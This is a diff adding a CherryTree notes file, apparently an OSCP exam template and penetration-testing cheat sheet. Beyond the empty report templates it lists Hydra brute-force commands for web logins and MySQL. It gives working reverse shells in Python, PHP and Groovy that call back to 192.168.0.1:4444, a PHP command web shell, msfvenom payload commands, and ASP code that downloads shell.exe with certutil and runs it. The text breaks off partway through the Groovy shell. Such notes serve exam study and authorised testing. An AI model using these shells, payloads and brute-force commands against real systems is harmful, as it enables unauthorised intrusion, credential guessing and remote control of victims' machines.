@@ -1,0 +1,1905 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="192.168.162.220" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
+    <rich_text>IP :192.168.162.220
+Hostname:
+OS:
+
+
+
+
+
+Linux Proof: </rich_text>
+    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
+    <rich_text>
+Windows Proof: </rich_text>
+    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
+    <rich_text>
+</rich_text>
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1676120787"/>
+    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
+      <rich_text weight="heavy">Service Exploited:  
+Vulnerability Type:
+Exploit POC:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">Description</rich_text>
+      <rich_text>: 
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
+      <rich_text>
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
+      <rich_text>
+
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
+      <rich_text>
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+
+
+
+
+
+</rich_text>
+    </node>
+    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
+      <rich_text weight="heavy">Service Exploited:  
+Vulnerability Type:
+Exploit POC:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">Description</rich_text>
+      <rich_text>: 
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
+      <rich_text>
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
+      <rich_text>
+
+
+
+
+
+
+
+</rich_text>
+      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
+      <rich_text>
+
+   ☐ Screenshot with ifconfig\ipconfig
+   ☐ Submit too OSCP Exam Panel
+
+</rich_text>
+    </node>
+    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
+      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
+      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
+      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953479"/>
+    </node>
+    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1687690629">
+      <rich_text>
+
+☐ </rich_text>
+      <rich_text link="node 36">nmap</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 31">gobuster</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 33">nikto</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 37">FTP</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 34">smb</rich_text>
+      <rich_text>
+☐ </rich_text>
+      <rich_text link="node 35">Active Directory</rich_text>
+      <rich_text> 
+☐ </rich_text>
+      <rich_text link="node 32">ssh</rich_text>
+      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
+        <rich_text> </rich_text>
+        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690629">
+          <rich_text underline="single" scale="h1">Hydra</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
+          <rich_text>
+Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
+          <rich_text family="monospace">https-post-form</rich_text>
+          <rich_text> instead of </rich_text>
+          <rich_text family="monospace">http-post-form</rich_text>
+          <rich_text> for HTTPS sites.
+
+</rich_text>
+          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">MYSQL</rich_text>
+          <rich_text>
+Change MYDATABASENAME. Default databasename is mysql.
+
+</rich_text>
+          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15</rich_text>
+          <rich_text>
+
+</rich_text>
+        </node>
+      </node>
+      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687691258">
+        <rich_text>
+
+☐ </rich_text>
+        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
+        <rich_text>
+☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
+        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+rlwrap enables the usage of arrow keys in your shell. </rich_text>
+          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
+        </node>
+        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text underline="single" scale="h1">Python</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single">As Command:</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single">Python Code:</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
+          <rich_text family="monospace"> socket,subprocess,os
+s</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
+          <rich_text family="monospace">socket.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
+          <rich_text family="monospace">(socket.</rich_text>
+          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
+          <rich_text family="monospace">,socket.</rich_text>
+          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
+          <rich_text family="monospace">)
+s.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
+          <rich_text family="monospace">(("192.168.0.1",</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
+          <rich_text family="monospace">));os.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
+          <rich_text family="monospace">(s.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
+          <rich_text family="monospace">(),</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)
+os.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
+          <rich_text family="monospace">(s.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
+          <rich_text family="monospace">(),</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
+          <rich_text family="monospace">)
+os.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
+          <rich_text family="monospace">(s.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
+          <rich_text family="monospace">(),</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
+          <rich_text family="monospace">)
+p</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
+          <rich_text family="monospace">subprocess.</rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
+          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
+        </node>
+        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text>PHP</rich_text>
+          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
+          </node>
+          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
+          </node>
+          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
+            <rich_text family="monospace">php </rich_text>
+            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
+            <rich_text family="monospace"> </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Call the CMD shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
+            <rich_text family="monospace">cmd=whoami</rich_text>
+          </node>
+          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
+            <rich_text>
+</rich_text>
+          </node>
+          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">Version 1</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
+            <rich_text family="monospace">php </rich_text>
+            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">Version 2</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
+            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
+            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
+            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">As Command</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
+          </node>
+        </node>
+        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Reverse Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Bind Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Reverse Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Bind Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Meterpreter:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
+          </node>
+          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Reverse Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+            <rich_text family="monospace"> rev_shell.elf</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Bind Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+            <rich_text family="monospace"> bind_shell.elf</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Reverse Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+            <rich_text family="monospace"> rev_shell.elf</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text underline="single">Bind Shell:</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+            <rich_text family="monospace"> rev_shell.elf</rich_text>
+          </node>
+          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
+            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+            <rich_text family="monospace"> shell.jsp</rich_text>
+          </node>
+          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
+            <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
+            <rich_text>
+
+</rich_text>
+            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
+          </node>
+        </node>
+        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
+          <rich_text family="monospace">% 
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
+o = </rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
+          <rich_text family="monospace">()
+Response.write(o)
+%</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace">
+</rich_text>
+          <rich_text>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Execute a File</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
+          <rich_text family="monospace">% 
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
+o = </rich_text>
+          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
+          <rich_text family="monospace">()
+Response.write(o)
+%</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace">
+</rich_text>
+          <rich_text>
+</rich_text>
+        </node>
+        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace">String host</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">"192.168.0.1";
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
+          <rich_text family="monospace"> port</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
+          <rich_text family="monospace">;
+String cmd</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">"/bin/sh";
+Process p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
+          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">redirectErrorStream(</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
+          <rich_text family="monospace">)</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">start();Socket s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
+          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getInputStream(),pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getErrorStream(), si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getOutputStream(),so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getOutputStream();</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">isClosed()){</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">flush();po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">flush();Thread</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">sleep(</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
+          <rich_text family="monospace">);</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
